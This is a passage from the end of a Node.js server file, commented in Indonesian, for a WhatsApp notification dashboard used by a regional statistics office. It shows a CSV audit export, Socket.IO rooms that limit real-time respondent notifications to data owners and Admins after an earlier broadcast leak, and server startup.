  const tanggal = new Date().toISOString().slice(0, 10);
  res.setHeader('Content-Type', 'text/csv; charset=utf-8');
  res.setHeader('Content-Disposition', `attachment; filename="laporan_audit_se2026_${tanggal}.csv"`);
  res.send(csv);
});

// -----------------------------------------------------------------------------
// START
// -----------------------------------------------------------------------------
// -----------------------------------------------------------------------------
// FITUR 6: SOCKET.IO — kirim QR & status WA ke dashboard web secara real-time
// -----------------------------------------------------------------------------
const server = http.createServer(app);
const io = new Server(server);

// --- ISU 3 (lanjutan): ISOLASI DATA PADA KANAL REAL-TIME ---------------------
// Sebelumnya seluruh notifikasi dipancarkan dengan io.emit(), yaitu SIARAN ke
// semua browser yang sedang terhubung. Akibatnya seorang PML tetap melihat
// nama usaha & nama petugas dari baris milik Admin / PML lain begitu responden
// membalas — kebocoran yang tidak tertutup oleh penjagaan di endpoint /api.
//
// Perbaikannya dua lapis:
//   1. Socket wajib membawa sesi login yang sah (kalau tidak, langsung diputus).
//   2. Setiap socket masuk "room" sesuai identitasnya, dan notifikasi berisi
//      data responden hanya dikirim ke room pemilik data + room Admin.
io.engine.use(sessionMiddleware);

io.use((socket, next) => {
  const sesi = socket.request.session;
  const uid = sesi && sesi.passport && sesi.passport.user;   // diisi Passport saat login
  const user = uid ? db.findUserById(uid) : null;
  if (!user) return next(new Error('Sesi tidak sah. Silakan login kembali.'));
  socket.data.user = { id: user.id, role: user.role, email: user.email };
  next();
});

io.on('connection', (socket) => {
  const u = socket.data.user;
  socket.join('u:' + u.id);                      // room pribadi pemilik data
  if (u.role === 'Admin') socket.join('admin');  // Admin mengawasi seluruh data

  // Saat client web terhubung, kirim keadaan terkini.
  // QR HANYA untuk Admin: memindainya berarti menautkan akun WhatsApp kantor
  // sebagai gateway pengirim — kewenangan yang tidak dimiliki PML.
  if (wa.isReady()) socket.emit('wa-ready');
  else if (u.role === 'Admin' && wa.getLastQR()) socket.emit('wa-qr', wa.getLastQR());
});

// Kirim HANYA kepada pemilik baris + seluruh Admin (bukan siaran ke semua orang).
// pml_id kosong (data lama tanpa pemilik) -> cukup Admin yang menerima.
function kirimKePemilik(pmlId, event, payload) {
  const tujuan = pmlId ? io.to('admin').to('u:' + Number(pmlId)) : io.to('admin');
  tujuan.emit(event, payload);
}

// Status gateway (siap/terputus) bukan data responden -> boleh disiarkan ke
// semua yang login; semua peran perlu tahu apakah pesan bisa dikirim.
// QR adalah pengecualian: ia setara kredensial penautan perangkat, jadi hanya
// Admin yang boleh menerimanya.
wa.bus.on('qr', (qr) => io.to('admin').emit('wa-qr', qr));
wa.bus.on('ready', () => io.emit('wa-ready'));
wa.bus.on('disconnected', () => io.emit('wa-disconnected'));

// Notifikasi REAL-TIME ke dashboard: balasan responden, auto-teguran, blast selesai.
// Dashboard tak perlu menunggu penyegaran 5 detik — reaksi tampak seketika.
// Ketiganya memuat identitas usaha/petugas, jadi WAJIB lewat kirimKePemilik().
wa.bus.on('balasan', (d) => kirimKePemilik(d.pml_id, 'balasan-baru', d));
wa.bus.on('teguran', (d) => kirimKePemilik(d.pml_id, 'teguran-terkirim', d));
wa.bus.on('blast-selesai', (d) => kirimKePemilik(d.pml_id, 'blast-selesai', d));

server.listen(PORT, () => {
  console.log('\n==================================================');
  console.log('  SWARA - Sistem WhatsApp Responsif & Akurat (BPS Karangasem)');
  console.log(`  Dashboard : http://localhost:${PORT}`);
  console.log('==================================================');
  console.log('[APP] Menginisialisasi WhatsApp Gateway…');
});

// Pengaman: jangan biarkan error tak tertangani (mis. dari proses WhatsApp)
// mematikan seluruh server. Cukup catat, biarkan dashboard tetap hidup.
process.on('unhandledRejection', (reason) => {
  console.error('[APP] Peringatan (unhandledRejection):', reason && reason.message ? reason.message : reason);
});
process.on('uncaughtException', (err) => {
  console.error('[APP] Peringatan (uncaughtException):', err && err.message ? err.message : err);
});

// Inisialisasi WhatsApp (QR akan muncul di terminal DAN di dashboard web)
wa.initWA();

// Aktifkan penjadwalan Daily Push Notification (17:00 ke PML)
scheduler.startScheduler();

// Diekspor agar dapat diuji secara otomatis (integration test)
module.exports = app;
